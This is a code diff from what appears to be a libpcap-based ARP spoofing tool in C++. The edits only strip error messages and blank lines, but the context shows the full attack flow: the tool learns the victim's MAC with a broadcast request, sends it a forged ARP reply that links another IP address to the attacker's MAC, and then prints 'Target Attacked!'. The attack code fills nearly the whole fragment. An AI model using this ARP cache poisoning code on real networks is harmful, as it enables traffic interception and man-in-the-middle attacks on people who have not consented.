@@ -61,12 +61,7 @@ int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest
     packet.arp_.sip_ = htonl(sip); 
     packet.arp_.tmac_ = tmac; 
     packet.arp_.tip_ = htonl(tip); 
-
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    }
-
     return res;
 }
 
@@ -91,7 +86,6 @@ int main(int argc, char* argv[]) {
 	GetMacAddr(dev, my_mac);
 
 	EthArpPacket packet;
-	
 	for(int i=1;i<argc/2;i++){
 		send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),Mac(my_mac),Mac::nullMac(),Ip("0.0.0.0"),Ip(argv[2*i]),true);
 
@@ -102,10 +96,7 @@ int main(int argc, char* argv[]) {
 		while(true){ 
 			int res = pcap_next_ex(handle, &header, &rcvpacket);
 			if (res == 0) continue;
-			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-				break;
-			}
+			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
 
 			ethernet_hdr = (PEthHdr)rcvpacket;
 			uint16_t eth_type = ethernet_hdr->type();
@@ -117,7 +108,6 @@ int main(int argc, char* argv[]) {
 			}
 		}
 		Mac victim_mac = arp_hdr->smac();
-
 		if(send_packet_arp(Mac(argv[2*i]),Mac(my_mac),Mac(victim_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
 			printf("Target %d Attacked!\n", i);
 		}
